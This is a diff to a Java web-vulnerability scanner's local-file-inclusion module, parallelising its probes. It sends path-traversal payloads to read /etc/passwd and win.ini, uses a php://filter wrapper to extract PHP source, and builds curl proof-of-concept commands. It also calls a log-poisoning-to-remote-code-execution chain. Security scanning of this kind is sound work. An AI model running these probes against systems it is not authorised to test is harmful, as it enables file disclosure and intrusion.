@@ -9,6 +9,7 @@ import gg.effront.anarcry.scanner.ScanContext;
 import gg.effront.anarcry.scanner.Scanner;
 import gg.effront.anarcry.scanner.util.Http;
 import gg.effront.anarcry.scanner.util.HttpClientFactory;
+import gg.effront.anarcry.scanner.util.ProbeExecutor;
 
 import java.net.URI;
 import java.net.URLEncoder;
@@ -20,6 +21,9 @@ import java.util.ArrayList;
 import java.util.Base64;
 import java.util.LinkedHashSet;
 import java.util.List;
+import java.util.concurrent.Callable;
+import java.util.concurrent.atomic.AtomicBoolean;
+import java.util.concurrent.atomic.AtomicReference;
 import java.util.function.Consumer;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
@@ -44,6 +48,10 @@ import java.util.regex.Pattern;
  * Anti-FP: baseline fetched per (path, param) pair before injection; canonical
  * content pattern must NOT match the baseline to suppress false positives from
  * pages that already embed those strings.
+ *
+ * <p>
+ * Phases 1--3 parallelize by PATH via {@link ProbeExecutor}. Phase 4 (log
+ * poisoning) stays sequential because it depends on confirmed LFI state.
  */
 public class LfiModule implements Scanner {
 
@@ -151,113 +159,75 @@ public class LfiModule implements Scanner {
 
         log.accept("[~] LFI: iniciando scan de path traversal em " + base);
 
-        // State tracked across phases
-        boolean phpDetected = false;
-        boolean linuxConfirmed = false;
-        String confirmedPath = null;
-        String confirmedParam = null;
-        String confirmedPayload = null;
-        String serverHeader = null;
+        // Shared state across parallel phases
+        AtomicBoolean phpFlag = new AtomicBoolean(false);
+        AtomicReference<String> serverRef = new AtomicReference<>("");
+        AtomicReference<String> confirmedPathRef = new AtomicReference<>();
+        AtomicReference<String> confirmedParamRef = new AtomicReference<>();
+        AtomicReference<String> confirmedPayloadRef = new AtomicReference<>();
 
         List<Payload> linuxPayloads = mergeKbPayloads(false);
         List<Payload> windowsPayloads = mergeKbPayloads(true);
+        int concurrency = ctx.config().probeConcurrency();
 
         // -----------------------------------------------------------------------
-        // Phase 1: Linux traversal
+        // Phase 1: Linux traversal (parallel by path)
         // -----------------------------------------------------------------------
         log.accept("[~] LFI: fase 1 -- " + linuxPayloads.size() + " Linux payloads (" + PROBE_PATHS.size() + " paths × "
                 + FILE_PARAM_KEYWORDS.size() + " params)");
 
-        linuxOuter : for (int pi = 0; pi < PROBE_PATHS.size(); pi++) {
-            String path = PROBE_PATHS.get(pi);
-            log.accept("[~] LFI: [" + (pi + 1) + "/" + PROBE_PATHS.size() + "] " + path);
-            // Probe the path without params to fingerprint PHP and Server header
-            try {
-                HttpRequest probeReq = HttpRequest.newBuilder().uri(URI.create(base + path))
-                        .timeout(Duration.ofSeconds(5)).GET().build();
-                HttpResponse<String> probeResp = Http.send(ctx, hc, probeReq, HttpResponse.BodyHandlers.ofString(),
-                        id());
-                String probeBody = probeResp.body() != null ? probeResp.body() : "";
+        AtomicBoolean cancelLinux = new AtomicBoolean(false);
+        List<Callable<List<Finding>>> linuxTasks = new ArrayList<>();
 
-                // PHP fingerprint
-                String xPowered = probeResp.headers().firstValue("X-Powered-By").orElse("");
-                if (!phpDetected && (xPowered.toLowerCase().contains("php") || probeBody.contains("PHP Warning")
-                        || probeBody.contains("PHP Parse error") || probeBody.contains("<?php"))) {
-                    phpDetected = true;
-                    log.accept("[~] LFI: PHP fingerprinted em " + path);
+        for (int pi = 0; pi < PROBE_PATHS.size(); pi++) {
+            final int idx = pi;
+            final String path = PROBE_PATHS.get(pi);
+            linuxTasks.add(() -> {
+                List<Finding> local = new ArrayList<>();
+                if (cancelLinux.get()) {
+                    return local;
                 }
-                // Server header (first non-empty wins)
-                if (serverHeader == null || serverHeader.isBlank()) {
-                    serverHeader = probeResp.headers().firstValue("Server").orElse("");
-                }
-            } catch (Exception ignored) {
-            }
+                log.accept("[~] LFI: [" + (idx + 1) + "/" + PROBE_PATHS.size() + "] " + path);
 
-            for (String param : FILE_PARAM_KEYWORDS) {
-                // Anti-FP baseline -- fetch with a benign, non-existent file name
-                String baseline = fetchBody(ctx, hc, base + path + "?" + param + "=index");
+                // Probe the path without params to fingerprint PHP and Server header
+                try {
+                    HttpRequest probeReq = HttpRequest.newBuilder().uri(URI.create(base + path))
+                            .timeout(Duration.ofSeconds(5)).GET().build();
+                    HttpResponse<String> probeResp = Http.send(ctx, hc, probeReq, HttpResponse.BodyHandlers.ofString(),
+                            id());
+                    String probeBody = probeResp.body() != null ? probeResp.body() : "";
 
-                // Skip if baseline already contains the oracle string (pre-existing content)
-                if (LINUX_PATTERN.matcher(baseline).find()) {
-                    continue;
-                }
-
-                for (Payload payload : linuxPayloads) {
-                    String qv = payload.asQueryValue();
-                    String testUrl = base + path + "?" + param + "=" + qv;
-                    try {
-                        HttpRequest req = HttpRequest.newBuilder().uri(URI.create(testUrl))
-                                .timeout(Duration.ofSeconds(6)).GET().build();
-                        HttpResponse<String> resp = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.ofString(), id());
-                        String body = resp.body() != null ? resp.body() : "";
-
-                        if (LINUX_PATTERN.matcher(body).find()) {
-                            log.accept("[!!!] LFI Linux: /etc/passwd lido via " + path + "?" + param + "="
-                                    + payload.value());
-                            linuxConfirmed = true;
-                            confirmedPath = path;
-                            confirmedParam = param;
-                            confirmedPayload = payload.value();
-
-                            String poc = "curl '" + base + path + "?" + param + "="
-                                    + URLEncoder.encode(payload.value(), "UTF-8") + "'";
-
-                            findings.add(Finding.of(id(), path + "?" + param + "=" + payload.value(),
-                                    "LFI -- Leitura de /etc/passwd confirmada", Severity.CRITICAL,
-                                    "Payload: " + payload.value() + " | Resposta contém 'root:x:' | URL: " + testUrl,
-                                    "Path traversal confirma leitura arbitrária de arquivos do sistema. "
-                                            + "Exposição de /etc/passwd revela contas locais e pode encadear "
-                                            + "ataques de log poisoning ou brute-force de credenciais.",
-                                    poc,
-                                    "Validar e sanitizar caminhos; usar allowlist de arquivos permitidos; "
-                                            + "nunca interpolar entrada do usuário em operações de leitura de arquivo; "
-                                            + "aplicar chroot ou contenção de processo.",
-                                    cweId, cweTitle, cvssVec, score));
-                            break linuxOuter;
-                        }
-                    } catch (Exception ignored) {
+                    // PHP fingerprint
+                    String xPowered = probeResp.headers().firstValue("X-Powered-By").orElse("");
+                    if (!phpFlag.get() && (xPowered.toLowerCase().contains("php") || probeBody.contains("PHP Warning")
+                            || probeBody.contains("PHP Parse error") || probeBody.contains("<?php"))) {
+                        phpFlag.set(true);
+                        log.accept("[~] LFI: PHP fingerprinted em " + path);
                     }
+                    // Server header (first non-blank wins)
+                    String srv = probeResp.headers().firstValue("Server").orElse("");
+                    if (!srv.isBlank()) {
+                        serverRef.compareAndSet("", srv);
+                    }
+                } catch (Exception ignored) {
                 }
-            }
-        }
 
-        // -----------------------------------------------------------------------
-        // Phase 2: Windows traversal (only if Linux not confirmed)
-        // -----------------------------------------------------------------------
-        if (!linuxConfirmed) {
-            log.accept("[~] LFI: fase 2 -- " + windowsPayloads.size() + " Windows payloads (" + PROBE_PATHS.size()
-                    + " paths × " + FILE_PARAM_KEYWORDS.size() + " params)");
-
-            windowsOuter : for (int wi = 0; wi < PROBE_PATHS.size(); wi++) {
-                String path = PROBE_PATHS.get(wi);
-                log.accept("[~] LFI win: [" + (wi + 1) + "/" + PROBE_PATHS.size() + "] " + path);
                 for (String param : FILE_PARAM_KEYWORDS) {
+                    if (cancelLinux.get()) {
+                        return local;
+                    }
+                    // Anti-FP baseline -- fetch with a benign, non-existent file name
                     String baseline = fetchBody(ctx, hc, base + path + "?" + param + "=index");
-                    if (WINDOWS_PATTERN.matcher(baseline).find()) {
+
+                    // Skip if baseline already contains the oracle string (pre-existing content)
+                    if (LINUX_PATTERN.matcher(baseline).find()) {
                         continue;
                     }
 
-                    for (Payload payload : windowsPayloads) {
+                    for (Payload payload : linuxPayloads) {
+                        if (cancelLinux.get()) {
+                            return local;
+                        }
                         String qv = payload.asQueryValue();
                         String testUrl = base + path + "?" + param + "=" + qv;
                         try {
@@ -267,87 +237,196 @@ public class LfiModule implements Scanner {
                                     id());
                             String body = resp.body() != null ? resp.body() : "";
 
-                            if (WINDOWS_PATTERN.matcher(body).find()) {
-                                log.accept("[!!!] LFI Windows: win.ini lido via " + path + "?" + param + "="
+                            if (LINUX_PATTERN.matcher(body).find()) {
+                                log.accept("[!!!] LFI Linux: /etc/passwd lido via " + path + "?" + param + "="
                                         + payload.value());
+                                confirmedPathRef.set(path);
+                                confirmedParamRef.set(param);
+                                confirmedPayloadRef.set(payload.value());
 
                                 String poc = "curl '" + base + path + "?" + param + "="
                                         + URLEncoder.encode(payload.value(), "UTF-8") + "'";
 
-                                findings.add(Finding.of(id(), path + "?" + param + "=" + payload.value(),
-                                        "LFI -- Leitura de windows/win.ini confirmada", Severity.HIGH,
-                                        "Payload: " + payload.value() + " | Resposta contém '[extensions]' | URL: "
+                                local.add(Finding.of(id(), path + "?" + param + "=" + payload.value(),
+                                        "LFI -- Leitura de /etc/passwd confirmada", Severity.CRITICAL,
+                                        "Payload: " + payload.value() + " | Resposta contém 'root:x:' | URL: "
                                                 + testUrl,
-                                        "Path traversal confirma leitura de arquivos do sistema Windows.", poc,
-                                        "Validar e sanitizar caminhos; usar allowlist de arquivos permitidos.", cweId,
-                                        cweTitle, cvssVec, score));
-                                break windowsOuter;
+                                        "Path traversal confirma leitura arbitrária de arquivos do sistema. "
+                                                + "Exposição de /etc/passwd revela contas locais e pode encadear "
+                                                + "ataques de log poisoning ou brute-force de credenciais.",
+                                        poc,
+                                        "Validar e sanitizar caminhos; usar allowlist de arquivos permitidos; "
+                                                + "nunca interpolar entrada do usuário em "
+                                                + "operações de leitura de arquivo; "
+                                                + "aplicar chroot ou contenção de processo.",
+                                        cweId, cweTitle, cvssVec, score));
+                                cancelLinux.set(true);
+                                return local;
                             }
                         } catch (Exception ignored) {
                         }
                     }
                 }
+                return local;
+            });
+        }
+
+        findings.addAll(ProbeExecutor.run(linuxTasks, concurrency, cancelLinux));
+        boolean linuxConfirmed = !findings.isEmpty();
+
+        // -----------------------------------------------------------------------
+        // Phase 2: Windows traversal (only if Linux not confirmed -- parallel by path)
+        // -----------------------------------------------------------------------
+        if (!linuxConfirmed) {
+            log.accept("[~] LFI: fase 2 -- " + windowsPayloads.size() + " Windows payloads (" + PROBE_PATHS.size()
+                    + " paths × " + FILE_PARAM_KEYWORDS.size() + " params)");
+
+            AtomicBoolean cancelWindows = new AtomicBoolean(false);
+            List<Callable<List<Finding>>> windowsTasks = new ArrayList<>();
+
+            for (int wi = 0; wi < PROBE_PATHS.size(); wi++) {
+                final int idx = wi;
+                final String path = PROBE_PATHS.get(wi);
+                windowsTasks.add(() -> {
+                    List<Finding> local = new ArrayList<>();
+                    if (cancelWindows.get()) {
+                        return local;
+                    }
+                    log.accept("[~] LFI win: [" + (idx + 1) + "/" + PROBE_PATHS.size() + "] " + path);
+
+                    for (String param : FILE_PARAM_KEYWORDS) {
+                        if (cancelWindows.get()) {
+                            return local;
+                        }
+                        String baseline = fetchBody(ctx, hc, base + path + "?" + param + "=index");
+                        if (WINDOWS_PATTERN.matcher(baseline).find()) {
+                            continue;
+                        }
+
+                        for (Payload payload : windowsPayloads) {
+                            if (cancelWindows.get()) {
+                                return local;
+                            }
+                            String qv = payload.asQueryValue();
+                            String testUrl = base + path + "?" + param + "=" + qv;
+                            try {
+                                HttpRequest req = HttpRequest.newBuilder().uri(URI.create(testUrl))
+                                        .timeout(Duration.ofSeconds(6)).GET().build();
+                                HttpResponse<String> resp = Http.send(ctx, hc, req,
+                                        HttpResponse.BodyHandlers.ofString(), id());
+                                String body = resp.body() != null ? resp.body() : "";
+
+                                if (WINDOWS_PATTERN.matcher(body).find()) {
+                                    log.accept("[!!!] LFI Windows: win.ini lido via " + path + "?" + param + "="
+                                            + payload.value());
+
+                                    String poc = "curl '" + base + path + "?" + param + "="
+                                            + URLEncoder.encode(payload.value(), "UTF-8") + "'";
+
+                                    local.add(Finding.of(id(), path + "?" + param + "=" + payload.value(),
+                                            "LFI -- Leitura de windows/win.ini confirmada", Severity.HIGH,
+                                            "Payload: " + payload.value() + " | Resposta contém '[extensions]' | URL: "
+                                                    + testUrl,
+                                            "Path traversal confirma leitura de arquivos do sistema Windows.", poc,
+                                            "Validar e sanitizar caminhos; usar allowlist de arquivos permitidos.",
+                                            cweId, cweTitle, cvssVec, score));
+                                    cancelWindows.set(true);
+                                    return local;
+                                }
+                            } catch (Exception ignored) {
+                            }
+                        }
+                    }
+                    return local;
+                });
             }
+
+            findings.addAll(ProbeExecutor.run(windowsTasks, concurrency, cancelWindows));
         }
 
         // -----------------------------------------------------------------------
-        // Phase 3: PHP stream wrapper -- only if PHP was detected
+        // Phase 3: PHP stream wrapper -- only if PHP was detected (parallel by path)
         // -----------------------------------------------------------------------
-        if (phpDetected) {
+        if (phpFlag.get()) {
             log.accept("[~] LFI: fase 3 -- PHP wrapper php://filter");
 
-            phpOuter : for (String path : PROBE_PATHS) {
-                for (String param : FILE_PARAM_KEYWORDS) {
-                    String encoded = URLEncoder.encode(PHP_WRAPPER_PAYLOAD, "UTF-8");
-                    String testUrl = base + path + "?" + param + "=" + encoded;
-                    try {
-                        HttpRequest req = HttpRequest.newBuilder().uri(URI.create(testUrl))
-                                .timeout(Duration.ofSeconds(6)).GET().build();
-                        HttpResponse<String> resp = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.ofString(), id());
-                        String body = resp.body() != null ? resp.body() : "";
+            AtomicBoolean cancelPhp = new AtomicBoolean(false);
+            List<Callable<List<Finding>>> phpTasks = new ArrayList<>();
 
-                        Matcher b64m = PHP_B64_PATTERN.matcher(body);
-                        if (b64m.find()) {
-                            // Validate: decoded content must resemble PHP source
-                            boolean confirmedPhp = false;
-                            try {
-                                byte[] decoded = Base64.getDecoder().decode(b64m.group());
-                                String text = new String(decoded);
-                                confirmedPhp = text.contains("<?php") || text.contains("<?") || text.contains("require")
-                                        || text.contains("$_");
-                            } catch (Exception ignored) {
-                            }
-
-                            if (confirmedPhp) {
-                                log.accept(
-                                        "[!!!] LFI PHP wrapper: código-fonte PHP extraído via " + path + "?" + param);
-
-                                findings.add(Finding.of(id(), path + "?" + param + "=" + PHP_WRAPPER_PAYLOAD,
-                                        "LFI -- php://filter wrapper confirma leitura de código-fonte PHP",
-                                        Severity.HIGH,
-                                        "php://filter/convert.base64-encode/resource=index.php retornou base64 "
-                                                + "decodificável para código PHP | URL: " + testUrl,
-                                        "Wrapper php://filter permite exfiltração do código-fonte PHP, expondo "
-                                                + "lógica de negócio, credenciais em config files, tokens e chaves.",
-                                        "curl '" + testUrl + "' | grep -oP '[A-Za-z0-9+/=]{100,}' | base64 -d",
-                                        "Desabilitar allow_url_include e allow_url_fopen no php.ini; "
-                                                + "nunca interpolar parâmetros do usuário em include()/require(); "
-                                                + "usar realpath() + verificação de prefixo de diretório permitido.",
-                                        cweId, cweTitle, cvssVec, score));
-                                break phpOuter;
-                            }
-                        }
-                    } catch (Exception ignored) {
+            for (String path : PROBE_PATHS) {
+                phpTasks.add(() -> {
+                    List<Finding> local = new ArrayList<>();
+                    if (cancelPhp.get()) {
+                        return local;
                     }
-                }
+
+                    for (String param : FILE_PARAM_KEYWORDS) {
+                        if (cancelPhp.get()) {
+                            return local;
+                        }
+                        String encoded = URLEncoder.encode(PHP_WRAPPER_PAYLOAD, "UTF-8");
+                        String testUrl = base + path + "?" + param + "=" + encoded;
+                        try {
+                            HttpRequest req = HttpRequest.newBuilder().uri(URI.create(testUrl))
+                                    .timeout(Duration.ofSeconds(6)).GET().build();
+                            HttpResponse<String> resp = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.ofString(),
+                                    id());
+                            String body = resp.body() != null ? resp.body() : "";
+
+                            Matcher b64m = PHP_B64_PATTERN.matcher(body);
+                            if (b64m.find()) {
+                                // Validate: decoded content must resemble PHP source
+                                boolean confirmedPhp = false;
+                                try {
+                                    byte[] decoded = Base64.getDecoder().decode(b64m.group());
+                                    String text = new String(decoded);
+                                    confirmedPhp = text.contains("<?php") || text.contains("<?")
+                                            || text.contains("require") || text.contains("$_");
+                                } catch (Exception ignored) {
+                                }
+
+                                if (confirmedPhp) {
+                                    log.accept("[!!!] LFI PHP wrapper: código-fonte PHP extraído via " + path + "?"
+                                            + param);
+
+                                    local.add(Finding.of(id(), path + "?" + param + "=" + PHP_WRAPPER_PAYLOAD,
+                                            "LFI -- php://filter wrapper confirma leitura de código-fonte PHP",
+                                            Severity.HIGH,
+                                            "php://filter/convert.base64-encode/resource=index.php retornou base64 "
+                                                    + "decodificável para código PHP | URL: " + testUrl,
+                                            "Wrapper php://filter permite exfiltração do código-fonte PHP, expondo "
+                                                    + "lógica de negócio, credenciais "
+                                                    + "em config files, tokens e chaves.",
+                                            "curl '" + testUrl + "' | grep -oP '[A-Za-z0-9+/=]{100,}' | base64 -d",
+                                            "Desabilitar allow_url_include e allow_url_fopen no php.ini; "
+                                                    + "nunca interpolar parâmetros do usuário em include()/require(); "
+                                                    + "usar realpath() + verificação de prefixo "
+                                                    + "de diretório permitido.",
+                                            cweId, cweTitle, cvssVec, score));
+                                    cancelPhp.set(true);
+                                    return local;
+                                }
+                            }
+                        } catch (Exception ignored) {
+                        }
+                    }
+                    return local;
+                });
             }
+
+            findings.addAll(ProbeExecutor.run(phpTasks, concurrency, cancelPhp));
         }
 
         // -----------------------------------------------------------------------
         // Phase 4: Log poisoning → RCE chain (requires Linux LFI + Apache/Nginx)
         // -----------------------------------------------------------------------
-        if (linuxConfirmed && serverHeader != null
+        String serverHeader = serverRef.get();
+        if (linuxConfirmed && !serverHeader.isBlank()
                 && (SERVER_APACHE.matcher(serverHeader).find() || SERVER_NGINX.matcher(serverHeader).find())) {
+            String confirmedPath = confirmedPathRef.get();
+            String confirmedParam = confirmedParamRef.get();
+            String confirmedPayload = confirmedPayloadRef.get();
+
             log.accept("[~] LFI: fase 4 -- tentando log poisoning chain (" + serverHeader + ")");
             String rceEvidence = tryLogPoisoningChain(ctx, hc, base, confirmedPath, confirmedParam, serverHeader, log);
 
